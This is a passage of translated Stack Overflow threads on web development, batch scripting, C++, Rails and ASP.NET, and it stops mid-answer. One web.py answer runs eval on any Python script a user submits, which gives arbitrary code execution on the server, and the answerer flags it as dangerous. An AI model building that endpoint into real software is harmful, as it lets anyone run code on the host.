问题是需要哪些命令或 python 命令来发送包含“打印你好世界”的脚本，然后连接到 mod_wsgi 服务器端？

连接后如何显示共鸣？

AMPPS 是否需要任何配置以允许 mod_wsgi 正常工作（阅读有关配置 httpd.conf 文件的线程）？

对于所有的问题，我很抱歉，我完全把 atm 难住了，我的 Python 书已经超出了我的想象。

亲切的问候安迪

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:53:54.400

我做过的最简单的 wsgi 工作是使用[web.py](http://webpy.org/)。

[这](http://webpy.org/cookbook/mod_wsgi-apache)是 apache mod_wsgi 设置文档。

您需要一个带有 GET 方法的类，该类使用输入表单呈现 html，该输入表单将接收脚本，然后将其 POST 回 POST 方法（如果您愿意，在同一个类上）。您的 post 方法的响应将是您在 python 脚本上调用 eval 得到的任何结果。注意：这是一个非常危险的应用程序，因为用户现在可以在您的服务器上以服务器进程运行的任何用户身份运行未经验证的 python 脚本。

示例代码：

```
import web

class Echo:
    def GET(self):
        return """<html><form name="script-input-form" action="/" method="post">
Script: <input type="text" name="script-body">
<input type="submit" value="Submit">
</form><html>"""

    def POST(self):
        data = web.input()
        obj = compile(data['script-body'], '', 'exec')
        result = eval(obj, globals(), locals())
        web.seeother('/')

urls = (
  '/.*', Echo,
)
if __name__ == "__main__": 
    app = web.application(urls, globals())
    app.run()
else:
    app = web.application(urls, globals()).wsgifunc() 
```

我还必须评论一下，如果您只是学习编程，只是学习 python，并且没有做过任何 apache 配置，那么您会同时咬掉很多东西。您可能希望以更易消化的部分学习这些项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:51:06.380

我推荐你使用 Bottle.js，这里有一个来自[Bottlepy.org](http://bottlepy.org)的例子：

```
from bottle import route, run, template

@route('/hello/:name')
def index(name='World'):
    return template('<b>Hello {{name}}</b>!', name=name)

run(host='localhost', port=8080) 
```

您可以[快速下载和安装](http://bottlepy.org/docs/dev/tutorial.html#installation)，Bottle 使用 Python 2.5+ 和 3.x 运行，并能够为 Web 应用程序路由和自定义您的响应。

# search - MS-DOS 批处理：目录中的非递归文件搜索

> ID：16122773
> 
> 赞同：-1
> 
> 时间：2013-04-20T16:46:41.973
> 
> 标签：search, batch-file

我的目标是在 C:\ 驱动器的任何目录中搜索名为“setup95.exe”的文件，但不是这些目录的目录。如果文件存在，那么我需要将路径写入一个名为`%getpath%`.

我最初试图简单地使用`dir`，但它不符合我的期望。我需要在 C:\ 中获取任何目录并搜索它。例如，假设我在 C:\ 中有一个名为`__neverhood`. 在该文件夹中，有一个名为`setup95.exe`. 该程序不知道它是哪个文件夹。它只知道它在 C:\ 中，因此它需要在 C:\ 中的每个目录中搜索才能找到`setup95.exe`.

更新：新代码。它找到了文件，但对磁盘驱动器没有好处。这是代码的摘录：

```
@ECHO OFF
SETLOCAL 
SET "traversity=C:\Program Files (x86)\"
if not exist "C:\Program Files (x86)" SET "traversity=C:\Program Files\"

SET intricacy=%traversity%The Neverhood Restoration Project
SET obscurity=%traversity%DreamWorks Interactive
SET psychedelia=%obscurity%\Neverhood
SET abstraction=WAVistaWin7.exe

:removenrp
if exist "%traversity%The Neverhood Restoration Project Julia\unins000.exe" ( 
    "%traversity%The Neverhood Restoration Project Julia\unins000.exe"
)

:delreg
if %PROCESSOR_ARCHITECTURE%==x86 ( 
    reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\DreamWorks Interactive" /f
) else ( 
    if %PROCESSOR_ARCHITECTURE%==AMD64 ( 
        reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\DreamWorks Interactive" /f
    ) else (
        reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\DreamWorks Interactive" /f
)) 

if exist "%obscurity%" echo y | rmdir /S /Q "%obscurity%"

mkdir "%obscurity%"
mkdir "%psychedelia%"
copy /Y "%~dp0%abstraction%" "%psychedelia%"
for /d %%a in (c:\*) do for /f "delims=" %%i in ('dir /b /a-d "%%~a\setup95.exe" 2^>nul') do set "getpath=%%~a"
if defined getpath (echo path is %getpath%) else rem ok 

if exist "%getpath%setup95.exe" (
    echo MSGBOX "Pyroneous did not distribute the Neverhood illicitly to you. Remember that the only legal way to run the Neverhood is to buy it. We will still permit you to install the Neverhood, but we are not responsible for your actions. You can read our full purposes at theneverhood.sourceforge.net. Thanks!" > %temp%\TEMPmessage.vbs
    call %temp%\TEMPmessage.vbs
    del %temp%\TEMPmessage.vbs /f /q
    reg import "%~dp0neverhood.reg"
    START "%getpath%setup95.exe"
) else (
    for %%D in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do vol %%D: >output 2>output && if exist %%D:\setup95.exe set DRIVE=%%D
    if not defined DRIVE echo It appears you don't have the Neverhood on your computer. Please check http://theneverhood.sourceforge.net/setup/ for more information. && pause
    if exist "%DRIVE%:\setup95.exe" (
        echo MSGBOX "Hey. Thank you for purchasing the Neverhood. That is, if you're not using an burned ISO/exploitation." > %temp%\TEMPmessage.vbs
        call %temp%\TEMPmessage.vbs
        del %temp%\TEMPmessage.vbs /f /q
        reg import "%~dp0neverhood.reg"
        START D:\setup95.exe 
```

) )

输出返回：

```
C:\Users\b\Desktop\somnacea\files\thankyousanta\necessity>install.bat
ERROR: The system was unable to find the specified registry key or value.
The process tried to write to a nonexistent pipe.
        1 file(s) copied.
The process cannot access the file because it is being used by another process.
The process cannot access the file because it is being used by another process.
It appears you don't have the Neverhood on your computer. Please check http://th
eneverhood.sourceforge.net/setup/ for more information.
Press any key to continue . . . 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:15:21.780

可悲的是，你的问题像泥巴一样清楚。一个例子会很好。

您是否在询问如何检测所述文件是否存在于您指定的目录中，或者是否存在任何特定文件？

```
@ECHO OFF
SETLOCAL
:: version 1 - if you want to specify the drive and path and file
FOR /f %%i IN ("%~1") DO IF EXIST "%%i" (SET getpath=%%~pi) ELSE (SET getpath=)
ECHO (1) getpath=%getpath%

:: version 2 - if you want to specify path and assume drive and file
FOR /f %%i IN ("c:\%~1\setup95.exe") DO IF EXIST "%%i" (SET getpath=%%~pi) ELSE (SET getpath=)
ECHO (2) getpath=%getpath% 
```

使用参数运行它`"c:\directory I\want to\find\setup95.exe"`应该适用于第一个版本（`getpath`如果文件存在则设置为路径，否则为空）

使用参数运行它`"\directory I\want to\find"`应该适用于第二个版本（`getpath`如果文件存在则设置为路径，否则为空）

但是 - 如果你已经知道你的路径是什么，为什么不简单地使用`if exist "c:\path I want\to know\about\setup95.exe"`？

如果你不知道，你的意思是`"ANY directory in the C:\ drive--but not the directories of those directories"`什么？

* * *

给出更多数据：

```
@ECHO OFF
SETLOCAL
SET "getpath="
FOR /f "delims=" %%i IN ('dir /s /b /a-d c:\setup95.exe'
  ) DO IF DEFINED getpath (ECHO also found IN %%~pi) ELSE (SET getpath=%%~pi)
IF DEFINED getpath (ECHO first found AT %getpath%) ELSE (ECHO NOT found) 
```

应该显示找到的第一个位置，无论是在更多地方找到还是根本没有找到。

# javascript - jQuery UI Datepicker - 为什么第二个日期选择器在焦点上消失？

> ID：16122776
> 
> 赞同：5
> 
> 时间：2013-04-20T16:46:47.453
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-datepicker

我有两个`input`作为 jQuery UI 日期选择器的元素。在您对第一个 datepicker 元素进行选择后，它应该会自动关注第二个 datepicker 元素并显示日历，让您可以轻松快速地做出选择。

无论出于何种原因，第二个日期选择器/日历会出现片刻然后消失。我不确定它为什么会消失；谁能向我解释为什么它会消失以及可能的解决方案？

当前使用以下库：jQuery 1.8.3、jQuery UI 1.9.2

这是我目前正在使用的代码：

```
<ul class="fields">
    <li><label>Date picker #1</label>
        <input type="text" class="date-picker-1" />
    </li>
    <li><label> Date picker #2</label>
        <input type="text" class="date-picker-2" />
    </li>
</ul>

$('input.date-picker-1').datepicker({
    constrainInput: true,
    hideIfNoPrevNext: true,
    onSelect: function () {
        $(this).closest('.fields')
           .find('.date-picker-2').datepicker('show');
    }
});

$('input.date-picker-2').datepicker({
    onFocus: 'show'
}); 
```

这是一个小提琴：http: [//jsfiddle.net/B78JJ/](http://jsfiddle.net/B78JJ/)

如果任何其他信息会有所帮助，请随时询问，我很乐意提供帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T16:55:03.743

这似乎是一个焦点时间问题，快速的解决方法是使用一个小的超时：

```
$('input.date-picker-1').datepicker({
    constrainInput: true,
    hideIfNoPrevNext: true,
    onSelect: function () {
        var dees = $(this);
        setTimeout(function() { 
           dees.closest('.fields').find('.date-picker-2').datepicker('show');
        }, 100);
    }
}); 
```

见[**工作小提琴**](http://jsfiddle.net/B78JJ/3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:52:03.280

因为这

```
 $(this).closest('.fields')
           .find('.date-picker-2').datepicker('show'); 
```

您可以使用

```
window.setTimeout(function(){
           $('.date-picker-2').datepicker('show');
        }, 1); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-08-09T12:21:00.030

2019 年 8 月的今天，我们遇到了同样的问题。您可以使用方法 onClose 解决此问题。启用选项 changeMonth 或 changeYear 时会出现另一个问题，但已通过 onChangeMonthYear 解决。

```
$(function() {
	$from = $("#from");
  $to = $("#to");

	$from.datepicker({
  	onClose : function(){
      $to.datepicker('show');
    }
  });

  $to.datepicker({
    changeMonth: true,
    changeYear: true,
    onChangeMonthYear: function(year, month ){
    	$to.datepicker('setDate', new Date(year, month-1, 1));
    }
  });
})
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>

<input type="text" id="from">
<input type="text" id="to">
```

# c++ - 在没有初始化的情况下输入 if 语句

> ID：16122780
> 
> 赞同：0
> 
> 时间：2013-04-20T16:47:40.267
> 
> 标签：c++, if-statement, switch-statement, dtmf

我正在为我的 Arduino 编写一个 C++ 程序库。该库用于 DTMF 解码器。在将两个检测到和验证的音调一起添加以返回相应的按钮时，我遇到了问题。

我两次调用下面的函数（它还没有完全完成，但你会希望得到我的逻辑）。如果我将值 R1 和 R2 初始化为 0，那么它们会在第二次调用时相互覆盖。如果我根本不初始化它们，我会收到运行时检查错误。

我花了 40 多个小时试图弄清楚这一点（我是一个非常基础的程序员！）。任何帮助将不胜感激！

```
 int DTMF::validate(void)
    {
        int threshhold = 9000;
        int i;
        int x;
        int y;
    //  int high[7];

        for(i=0; i<7; i++)
        {
            if(magnitude[i] > threshhold)
            {
                return(i);  
            }
        }
    }

unsigned char DTMF::buttonPressed(void)
{
    int validatedFreq = validate();
    cout << "valid is returning: " << validatedFreq << endl;
    int R1;
    int R2;

    switch(validatedFreq)
    {

        case 0:
            R1=1;
            cout << "DEBUG:This is case 1 R1 output: " << R1 << endl;
            break;

        case 1:
            R1=2;
            break;

        case 2:
            R1=3;
            break;

        case 3:
            R2=4;
            cout << "DEBUG:This is case 3 R2 output: " << R2 << endl;
            break;

        case 4:
            R2=5;
            break;

        case 5:
            R2=6;
            break;

        case 6:
            R2=7;
            break;
    }

    if(R1==1 && R2==4)
    {
        cout << "DEBUG:The value of R1 is " << R1 << " and the value of R2 is " << R2 << endl;
        return(button[0]);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:56:18.517

R1 和 R2 是**局部变量**，因为您在函数内部声明了它们。这意味着每次调用函数时都会初始化它们，并且每次调用时，R1 和 R2 都是两个新的 int 变量。

如果您希望它们的值在函数的不同调用之间保持不变，您可以将它们声明为`static`. 这使得它们每次运行程序时只初始化一次。你用

`static int R2;`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:58:59.607

R1 和 R2 是 DTMF::buttonPressed 函数的本地和自动的，因此它们不会在调用之间持续存在。

如果您不初始化它们，则必须先分配它们，然后才能假定它们具有任何有意义的值。但是您的交换机只分配其中一个。但是您稍后会在下面假装同时使用它们`if`。

在那一点上，您可以观察到的任何行为都是未定义的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T16:59:13.483

您应该更改`R1`并`R2`进入班级`DTMF`成员（将它们移动到标题）。然后你应该在构造函数中将它们初始化为零，并检查**两者**是否都非零`if(R1==1 && R2==4)`。像这样：

```
// header:
class DTMF {
...
int R1;
int R2;
}
// cpp
DTMF::DTMF() : R1( 0 ), R2( 0 ) { ... }

unsigned char DTMF::buttonPressed(void)
{
    int validatedFreq = validate();
    cout << "valid is returning: " << validatedFreq << endl;
    //int R1;
    //int R2;

    // fill R1 or R2 exactly as you did

    if ( R1 != 0 && R2 != 0 && R1==1 && R2==4 ) {
        ...
        R1 = R2 = 0;
    } 
```

# ruby-on-rails - 如何删除 Ruby on Rails 4 beta？

> ID：16122781
> 
> 赞同：8
> 
> 时间：2013-04-20T16:47:53.183
> 
> 标签：ruby-on-rails, ruby, rubygems, rvm

我是 Ruby 和 Rails 的新手，在我安装 RVM 来管理我的版本之前，我在我的 Mac 上安装了 Rails 4 的最新 beta 版本。Rails 4 beta 正在成为一个巨大的痛苦，因为它是我在终端中打开的每个新标签中的默认版本。如何卸载 Rails 4 beta 和所有对它的引用？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-06-05T19:48:33.010

除了卸载 rails 之外，您还需要卸载 railties gem - rails exec 只是选择最新 railties gem 的包装器。

```
$ gem uninstall rails -v=4.0.0.beta1
$ gem uninstall railties -v=4.0.0.beta1 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-20T16:58:25.733

尝试：

```
$ gem uninstall rails -v=4.0.0.beta1 
```

或者

```
$ gem uninstall rails 
```

系统会询问您要卸载哪个版本（如果有多个）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-06-11T03:45:14.010

我和 ckarbass 有同样的问题（当我进入时，Rails 仍然设置为 4.0.0.rc1 `rails -v`）。为了解决它，我使用了 Bernard Potocki 的建议，但考虑到我有不同的版本。

为了使您可能拥有的任何版本成为可能，只需执行以下操作：

`gem uninstall rails`

然后，选择您拥有的 Rails 4 版本并将其删除。

然后做：

`gem uninstall railties`

并做同样的事情。

当我卸载 Rails 的 Rails 4 版本时，它告诉我不会满足几个 gem（coffee-rails 和 sass-rails）的依赖关系。所以我只是对他们两个做了同样的事情，就像我上面做的那样，并删除了他们的 Rails 4 版本（例如，对于 sass-rails，我安装了一个名为 sass-rails-4.0.0.rc1 的版本）。

并做了！终端现在将 3.2.13 列为我当前的 Rails 版本。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-08-16T17:24:23.630

我对 Rails 4.0.0 最终版也有同样的问题。我使用了之前提到的所有内容，但没有成功。有用的是列出我所有的宝石，我正在使用 Windows，所以它是：

```
>pik gem list 
```

然后我检查了rails版本。它显示了带有 railties 4.0.0、4.0.0.rc2 和 3.2.14 的 rails 3.2.14（我想要的）。

然后我跑了

```
gem uninstall railties 
```

并卸载了除 3.2.14 之外的所有其他版本，现在它运行良好。问题是当调用 Rails 3.2 安装时，安装了最新（或所有）版本的 railties。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-04-20T16:58:53.433

做

```
$ gem uninstall rails 
```

并选择版本 4 beta 作为要卸载的版本。此时不要担心不匹配的依赖项。只需说“是”即可继续卸载。

一旦它消失了，做

```
$ gem install rails 
```

这将为您获取并安装最新发布的版本。

# google-chrome - 谷歌浏览器位置：修复边界半径溢出：隐藏问题

> ID：16122782
> 
> 赞同：3
> 
> 时间：2013-04-20T16:48:07.190
> 
> 标签：google-chrome, overflow, css-position, css

我在使用`border-radius`带有. 该属性似乎不起作用。当您将鼠标悬停在具有红色背景的导航项上时， 应该被剪裁为 的形状，但它只是显示为标准矩形。`position:fixed``overflow:hidden``overflow``div``.bmopt``#mstrip`

**HTML：**

```
<div id='mstrip'>
    <div class='mlabel first'>
        <a href='#' class='mopt'>Item1</a>
        <div class='bmopt'></div>
    </div>
    <div class='mlabel'>
        <a href='#' class='mopt'>Item2</a>
        <div class='bmopt'></div>
    </div>
    <div class='mlabel'>
        <a href='#' class='mopt'>Item3</a>
        <div class='bmopt'></div>
    </div>
    <div class='mlabel'>
        <a href='#' class='mopt'>Item4</a>
        <div class='bmopt'></div>
    </div>
    <div class='mlabel'>
        <a href='#' class='mopt'>Item5</a>
        <div class='bmopt'></div>
    </div>
</div> 
```

**CSS：**

```
#mstrip {
    width: 92px;
    height: 223px;
    position: fixed;
    top: 20px;
    border-radius: 40% 8px;
    z-index: 100;
    background: #000;
    overflow: hidden;
    box-shadow: 0 0 4px #000;
}
.mlabel {
    width: 92px;
    height: 35px;
}
.first {
    margin-top: 24px;
}
.mopt {
    display: block;
    width: 92px;
    height: 29px;
    padding-top: 6px;
    text-align: center;
    color: #FFF;
    text-decoration: none;
    font: menu;
    font-size: 0.9em;
    text-shadow: 0 0 1px #FFF;
}
.bmopt {
    position: relative;
    width: 92px;
    height: 35px;
    background: #F00;
    margin-top: -35px;
    z-index: -1;
} 
```

这是此错误的一个工作示例：http: [//jsfiddle.net/UxLHR/7/](http://jsfiddle.net/UxLHR/7/)

有没有解决的办法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T20:08:15.857

I think that the problem arises from changing opacity in the element; that creates a separate stacking context and is probably the origin of the bug.

I have solved it making it simpler; just changing the color of the mlabel class on hover, and setting a transition on this. I don't think that the inner div is necesary.

```
.mlabel {
    width: 92px;
    height: 35px;
    background-color: black;
    -webkit-transition: background-color 1s;
}
.mlabel:hover {
    background-color: red;
} 
```

[updated fiddle](http://jsfiddle.net/UxLHR/14/)

(transition only for webkit)

# youtube-api - 我怎么知道我的 youtube 视频已经缓冲到足以使用 api 播放

> ID：16122785
> 
> 赞同：1
> 
> 时间：2013-04-20T16:48:31.003
> 
> 标签：youtube-api

如果我想使用 javascript api 搜索然后播放 youtube 视频，我首先需要等到视频缓冲。有时视频会在中间出现一个圆圈，然后转圈圈，我认为这意味着它的缓冲。

是否有一些我可以听到的事件告诉我不仅播放器已加载，而且播放器已缓冲到足以进行搜索？

另外，有没有办法知道玩家是否正在寻找，所以我可以等待寻找完成，然后再进行另一次寻找？谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T21:04:41.150

有一个关于向 Player API 添加“seek”事件的[开放功能请求](https://code.google.com/p/gdata-issues/issues/detail?id=2915)，但除了该问题跟踪器条目中关于是否/何时实施的信息之外，我没有任何消息。

一般来说，不会在 Player API 中添加任何内容以更轻松地对不同的缓冲场景做出反应，因为这限制了 Player 团队在更改缓冲策略而不破坏事物时能够做的事情。

# ruby - 带有soap4r 1.5.8 的Ruby 1.8.7 不理解WSDL 模式中的xml 组元素

> ID：16122788
> 
> 赞同：1
> 
> 时间：2013-04-20T16:48:47.790
> 
> 标签：ruby, soap4r

定义我的 SOAP API 的 WSDL 文档定义了一个 XML 类型，比如“EchoRequest”，它包含一个 XML“组”元素。使用soap4r，如果我以“EchoRequest”作为输入进行SOAP API调用，那么soap4r不理解组元素并在以下代码中给出错误。

如何让soap4r 理解XML 组元素？

我的红宝石代码有点像这样 -

```
wsdlUrl = 'http://www.example.com/schema/Echo.wsdl'
...
svc = SOAP::WSDLDriverFactory.new(wsdlUrl).create_rpc_driver
...
result = svc.Echo(:messageId => '', :version => '', :echoInput => 'Hello World')
... 
```

XSD 大致是这样的——

```
...
<xs:group name="EchoRequestParamGroup">
<xs:sequence>
<xs:element name="messageId" type="xs:string"/>
<xs:element name="version" type="xs:string"/>
<xs:element name="echoInput" type="xs:string"/>
</xs:sequence>
</xs:group>
...
<xs:element name="EchoRequest">
<xs:complexType>
<xs:complexContent>
<xs:sequence>
<xs:group ref="EchoRequestParamGroup"/>
</xs:sequence>
</xs:complexContent>
</xs:complexType>
</xs:element>
... 
```

错误 -

```
SOAP::Mapping::MappingError: unknown type: #<WSDL::XMLSchema::Group:0x55845c>
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/wsdlliteralregistry.rb:155:in `complexobj2sequencesoap'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/xsd/namedelements.rb:58:in `each'
    from org/jruby/RubyArray.java:1613:in `each'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/xsd/namedelements.rb:57:in `each'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/wsdlliteralregistry.rb:140:in `complexobj2sequencesoap'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/wsdlliteralregistry.rb:134:in `complexobj2soap'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/wsdlliteralregistry.rb:111:in `obj2typesoap'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/wsdlliteralregistry.rb:92:in `obj2elesoap'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/wsdlliteralregistry.rb:37:in `obj2soap'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/mapping.rb:131:in `_obj2soap'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/mapping.rb:43:in `obj2soap'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/mapping.rb:592:in `protect_mapping'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/mapping.rb:565:in `protect_threadvars'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/mapping.rb:581:in `protect_mapping'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/mapping/mapping.rb:42:in `obj2soap'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/rpc/proxy.rb:513:in `request_doc_lit'
... 7 levels...
    from (eval):6:in `Echo'
    from org/jruby/RubyKernel.java:2090:in `send'
    from D:/mywork/jruby-1.7.3/lib/ruby/gems/shared/gems/soap4r-1.5.8/lib/soap/wsdlDriver.rb:139:in `Echo'
    from org/jruby/RubyProc.java:261:in `call'
    from (irb):32:in `evaluate'
    from org/jruby/RubyKernel.java:1061:in `eval'
    from D:/mywork/jruby-1.7.3/lib/ruby/1.8/irb.rb:158:in `eval_input'
    from D:/mywork/jruby-1.7.3/lib/ruby/1.8/irb.rb:271:in `signal_status'
    from D:/mywork/jruby-1.7.3/lib/ruby/1.8/irb.rb:155:in `eval_input'
    from org/jruby/RubyKernel.java:1409:in `loop'
    from org/jruby/RubyKernel.java:1160:in `catch'
    from D:/mywork/jruby-1.7.3/lib/ruby/1.8/irb.rb:154:in `eval_input'
    from D:/mywork/jruby-1.7.3/lib/ruby/1.8/irb.rb:71:in `start'
    from org/jruby/RubyKernel.java:1160:in `catch'
    from D:/mywork/jruby-1.7.3/lib/ruby/1.8/irb.rb:70:in `start'
    from D:\mywork\jruby-1.7.3\/bin/jirb_swing:54:in `(root)' 
```

# wordpress - 使用 WordPress 内置函数存储数据时的 SQL 安全性

> ID：16122790
> 
> 赞同：9
> 
> 时间：2013-04-20T16:48:51.373
> 
> 标签：wordpress, security, sql-injection

当我使用 WordPress 内置功能时

`add_post_meta, update_post_meta, add_user_meta, update_user_meta`

`wp_insert_post, wp_insert_user`

在将用户输入数据传递给这些函数之前，我是否应该进行任何转义或清理，或者这些函数本身可以解决问题？

[在 codex Action_Reference/save_post](http://codex.wordpress.org/Plugin_API/Action_Reference/save_post#Example)中，数据`update_post_meta`直接从`$_POST`.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-20T16:55:54.753

元值使用 清理`sanitize_meta`，帖子内容通过 清理`wp_kses_post`，等等......您可以放心地假设内置函数是安全的。

# javascript - 在 ASP.NET MVC 中向 JavaScript 文件公开资源字符串的最佳方法？

> ID：16122791
> 
> 赞同：20
> 
> 时间：2013-04-20T16:48:55.590
> 
> 标签：javascript, asp.net, asp.net-mvc, localization

在 Razor 视图中使用资源字符串 (.resx) 很容易，但如何在 JavaScript 文件中做到这一点？目前我正在手动将字符串从 Razor 视图传递到 JavaScript 构造函数参数中的脚本，但我想要一种更自动地执行此操作的方法，因此我不必传递我需要的每个资源字符串。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-05-29T01:18:33.630

我使用的解决方案是使用 Razor 创建一个 json 对象，其中包含给定应用程序区域的所有资源字符串，例如“客户”。像这样：

```
<script  type="text/jscript">

@{

    ResourceSet resourceSet = JsCustomersRes.ResourceManager.GetResourceSet(CultureInfo.CurrentUICulture, true, true);
    var sbInitial = " var CustomersResourceObj = {"; 
    var sb = new StringBuilder(sbInitial);
    var resEnum = resourceSet.GetEnumerator(); 
    while (resEnum.MoveNext()) 
    {
        if (sb.ToString() != sbInitial)
        {
            sb.Append(",");
        }
        sb.Append("\"" + resEnum.Key + "\":\"" + resEnum.Value.ToString().Replace("\r\n", "").Replace("\"", "\\\"") + "\"");
    } 
    sb.Append("}");
} 

@(Html.Raw( sb.ToString())); 
```

资源文件“JsCustomersRes”可以与特定的控制器视图目录或共享视图目录一起放置。它应该在文件高级属性中将“自定义工具”设置为“PublicResXFileCodeGenerator”。

然后，您可以从脚本中的 json 对象获取资源字符串：

```
var resString = CustomersResourceObj[key]; 
```

其中“key”是您想要的资源字符串的键字符串。只需根据需要将 Razor 作为部分视图添加到您的布局页面或单个页面，就是这样！

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-03-25T01:28:48.190

我的解决方案基于此[http://codethug.com/2013/08/02/using-net-resources-in-javascript/](http://codethug.com/2013/08/02/using-net-resources-in-javascript/)并引用 Tim Larson 的（作者）的话：

> 我们不需要做太多的事情来确定使用什么文化。Web 浏览器在访问服务器时包含标头信息，显示它支持的文化。ASP.Net 自动将此信息放入 CultureInfo.CurrentUICulture。我们将它传递给 GetResourceSet 方法，然后该方法返回与当前浏览器设置匹配的资源集。
> 
> 因此，如果浏览器设置为法语，则将返回法语资源，并且仅返回法语资源。

陡峭 1\. 在 App_GlobalResources 文件夹中创建一个资源文件**RLocalizedText.resx**。并创建用所有字符串填充它。

2\. 创建**ResourcesController**

```
using System.Web.Mvc;

namespace PortalACA.Controllers
{
    public class ResourcesController : Controller
    {
        // GET: Resources
        public ActionResult Index()
        {
            Response.ContentType = "text/javascript";
            return View();
        }
    }
}
```

陡峭 3.从 ResourcesController创建**Index.cshtml视图**

```
@using System.Collections
@using System.Globalization
@using System.Resources
@using Resources
@{
    Layout = null;
    // Get a set of resources appropriate to
    // the culture defined by the browser
    ResourceSet resourceSet =
      @RLocalizedText.ResourceManager.GetResourceSet
        (CultureInfo.CurrentUICulture, true, true);
}

// Define the empty object in javascript
var Resources = {};
@foreach (DictionaryEntry res in resourceSet)
{
    // Create a property on the javascript object for each text resource
    @:Resources.@res.Key = "@Html.Raw(
        HttpUtility.JavaScriptStringEncode(res.Value.ToString()))";
}
```

选择你想在哪里使用它。

陡峭的 4A（布局）。如果您想在整个站点上使用它，则需要将此脚本引用放在@RenderSection 上的**_Layout**（共享视图）上

```
<script src="@Url.Content("~/Resources/Index")"></script>
@RenderSection("scripts", required: false) 
```

陡峭的 4B（视图）。如果您只想在某些视图中查看。

```
@section Scripts
{
  <script src="@Url.Content("~/Resources/Index")"></script>
} 
```

陡峭 5\. 现在是使用它的时候了。选择一个视图，您需要在其中查看资源文件中的字符串并放置此代码。

```
@section Scripts
{
  <script>
    $(document).ready(function () {
      alert(Resources.General_Excepcion);
    });
  </script>
} 
```

这就是所有的人！希望它可以帮助别人！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-20T19:05:34.557

我会做类似以下的事情：

```
<script type="text/javascript">
    var resourceStrings = {
        @foreach (var resource in ViewBag.Resources)
        {
            { '@resource.Key' : '@resource.Value' },
        }
    };
</script> 
```

这假定您已创建资源键/值字典并使用该字典设置视图包属性。然后，您可以通过 javascript 对象查找来访问这些资源。

```
$('label[name=gender]').html(resourceStrings['gender']); 
```

如果您想按文化访问键，您可能有一个字典字典：

```
$('label[name=gender]').html(resourceStrings['en_US']['gender']); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-05-07T22:21:26.100

我更喜欢创建一个将所有资源作为属性的 Javascript 对象。我也避免创建局部视图。相反，我将所需的语言作为参数传递给脚本。这样，您可以在全局模板中添加脚本，而不是在每个页面中添加它。

基本上我有一个具有以下静态方法的辅助静态类：

```
 public static JavaScriptResult JavascriptResources(ResourceManager manager, string resourceObjectName, CultureInfo culture)
    {
        ResourceSet resourceSet = manager.GetResourceSet(culture, true, true);

        StringBuilder sb = new StringBuilder();

        sb.AppendFormat("var {0}=new Object();", resourceObjectName);

        var enumerator = resourceSet.GetEnumerator();
        while (enumerator.MoveNext())
        {
            sb.AppendFormat("{0}.{1}='{2}';", resourceObjectName, enumerator.Key,
                System.Web.HttpUtility.JavaScriptStringEncode(enumerator.Value.ToString()));
        }

        return new JavaScriptResult()
        {
            Script = sb.ToString()
        };
    } 
```

在项目中，我添加了以下控制器：

```
public class ResourcesController : Controller
{
    [OutputCache(Duration = 36000, VaryByParam = "lang")]
    // Duration can be many hours as embedded resources cannot change without recompiling.
    // For the clients, I think 10 hours is good.
    public JavaScriptResult Index(string lang)
    {
        var culture = new CultureInfo(lang);
